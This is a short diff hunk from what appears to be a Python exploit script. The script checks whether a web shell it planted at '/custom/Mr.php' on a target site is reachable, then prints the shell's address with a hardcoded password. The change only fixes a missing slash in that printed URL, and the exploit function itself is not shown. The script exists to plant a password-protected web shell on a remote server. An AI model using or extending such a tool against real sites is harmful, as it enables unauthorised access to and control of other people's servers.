@@ -23,6 +23,6 @@ if __name__ == '__main__':
  	main_url = sys.argv[1]
  	exploit(main_url)
  	if req.get(main_url+"/custom/Mr.php").status_code==200:
-  		print "[*]exploit_success!shell:   "+main_url+"custom/Mr.php"+"   "+"password:HHH"
+  		print "[*]exploit_success!shell:   "+main_url+"/custom/Mr.php"+"   "+"password:HHH"
  	else:
  		print "[-]exploit fail!"
